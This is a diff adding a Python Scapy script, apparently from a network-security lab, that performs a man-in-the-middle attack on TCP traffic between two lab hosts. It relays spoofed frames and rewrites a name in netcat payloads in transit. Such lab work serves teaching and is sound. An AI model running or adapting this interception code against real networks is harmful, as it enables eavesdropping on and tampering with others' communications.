@@ -58,3 +58,49 @@ def tcp_spoof_pkt_telnet(pkt):
 
 # Step 4: Launch MITM attack
 pkt = sniff(filter='tcp', prn=tcp_spoof_pkt_telnet)
+
+
+
+
+
+
+
+
+from scapy.all import *
+
+A = "10.9.0.5"
+B = "10.9.0.6"
+M_mac = "02:42:0a:09:00:69"
+A_mac = "02:42:0a:09:00:05"
+B_mac = "02:42:0a:09:00:06"
+
+first_name = "huiqing"
+replacement_txt = "aaaaaaa"
+
+def censor_payload(payload):
+    return payload.replace(first_name, replacement_txt)
+
+def tcp_spoof_pkt_netcat(pkt):
+    if pkt.haslayer(Ether) and pkt.haslayer(IP) and pkt.haslayer(TCP):
+        if pkt[Ether].src != M_mac:
+            if pkt[IP].src == A and pkt[IP].dst == B:
+                pkt[Ether].src = M_mac
+                pkt[Ether].dst = B_mac
+
+                if pkt[TCP].payload:
+                    try:
+                        payload = pkt[TCP].payload.load.decode("utf-8")
+                        censored_payload = censor_payload(payload)
+                        del pkt[TCP].payload
+                        del pkt[TCP].chksum
+                        pkt[TCP] /= censored_payload
+                    except UnicodeDecodeError:
+                        pass
+                sendp(pkt, verbose=False)
+            elif pkt[IP].src == B and pkt[IP].dst == A:
+                pkt[Ether].src = M_mac
+                pkt[Ether].dst = A_mac
+                sendp(pkt, verbose=False)
+
+pkt = sniff(filter="tcp", prn=tcp_spoof_pkt_netcat)
+
